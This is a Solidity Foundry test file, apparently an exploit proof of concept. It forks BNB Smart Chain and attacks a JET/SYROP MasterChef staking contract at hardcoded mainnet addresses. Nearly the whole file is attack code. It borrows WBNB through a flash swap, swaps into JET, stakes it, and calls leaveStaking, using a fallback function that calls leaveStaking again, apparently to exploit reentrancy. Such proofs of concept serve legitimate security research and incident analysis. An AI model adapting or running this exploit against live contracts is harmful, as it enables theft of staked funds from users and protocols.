// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IUni_Pair_V2.sol";
import "./test/interfaces/IRouter.sol";
import "./test/interfaces/IPancakePair.sol";
import "./test/interfaces/IWBNB.sol";
// import "./test/interfaces/IPancakeRouter.sol";

interface IMasterChef {
    // Withdraw WINGS tokens from STAKING.
    function leaveStaking(uint256 _amount) external;
    // Stake WINGS tokens to MasterChef
    function enterStaking(uint256 _amount) external;
    // Deposit LP tokens to MasterChef for WINGS allocation.
    function deposit(uint256 _pid, uint256 _amount) external;
    // Withdraw without caring about rewards. EMERGENCY ONLY.
    function emergencyWithdraw(uint256 _pid) external;

}
interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}


interface Irouter {
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
interface IJetswapPair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
    function getReserves()external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
}

contract controllerTest is Test {
    using SafeMath for uint;
    IMasterChef private masterchef = IMasterChef(0x63d6EC1cDef04464287e2af710FFef9780B6f9F5);
    IPancakePair PancakePair =  IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IPancakeRouter private PkRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    WBNB wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IJetswapPair private wbnb_busd = IJetswapPair(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    IUni_Pair_V2 private busd_jet = IUni_Pair_V2(0xFBa740304f3fc39d0e79703a5D7788E13f877DC0);
    Irouter private router = Irouter(0xE85C6ab56A3422E7bAfd71e81Eb7d0f290646078);
    IERC20 lpToken = IERC20(0xFBa740304f3fc39d0e79703a5D7788E13f877DC0);
    IERC20 syrop = IERC20(0xd079475f820bb3A01932083382Aed733d3d61b47);
    IERC20 jet = IERC20(0x0487b824c8261462F88940f97053E65bDb498446);
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    address public owner;

    function setUp() public {
    vm.deal(address(this), 0);
    vm.createSelectFork("https://rpc.ankr.com/bsc", 41401174);
    owner = address(this);
        
    }

    function testExploit() public {
        bytes memory data = abi.encode(wbnb, 1000 * 10**18);
        PancakePair.swap(0, 1000 * 10**18, address(this), data);


    }

    function pancakeCall(
    address sender,
    uint256 amount0,
    uint256 amount1,
    bytes calldata data
    ) public {

    emit log_named_uint("After flashswap, wbnb balance of user:", wbnb.balanceOf(address(this)) / 1e18);
    swap_token_to_token(address(wbnb),address(busd), wbnb.balanceOf(address(owner)) / 2);
    emit log_named_uint("After flashswap, wbnb balance of user:", wbnb.balanceOf(address(this)) / 1e18);
    emit log_named_decimal_uint("busd from wbnb", busd.balanceOf(address(this)), 18);
    swap_token_to_token(address(busd),address(jet), 10000 * 10**18);
    emit log_named_decimal_uint("new busd", busd.balanceOf(address(this)), 18);
    emit log_named_decimal_uint("new jet", jet.balanceOf(address(this)), 18);
    // addlp();
    jet.approve(address(masterchef), type(uint256).max);
    masterchef.enterStaking(jet.balanceOf(owner));
    syrop.balanceOf(address(this));
    // masterchef.emergencyWithdraw(4);
    emit log_named_decimal_uint("new syrop", syrop.balanceOf(address(this)), 18);
    masterchef.leaveStaking(syrop.balanceOf(owner));
        
        
    }

    fallback() external {
        if (syrop.balanceOf(address(this)) > 0) {
            masterchef.leaveStaking(jet.balanceOf(owner));
        }
    }

    function addlp() internal {
        jet.approve(address(router), jet.balanceOf(address(this)));
        busd.approve(address(router), busd.balanceOf(address(this)));
        router.addLiquidity(address(jet),address(busd), jet.balanceOf(address(this)), busd.balanceOf(address(this)),0,0,address(this),block.timestamp+500);
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(PkRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        PkRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    function depositmch() internal {
        masterchef.deposit(4, lpToken.balanceOf(address(owner)));
    }

}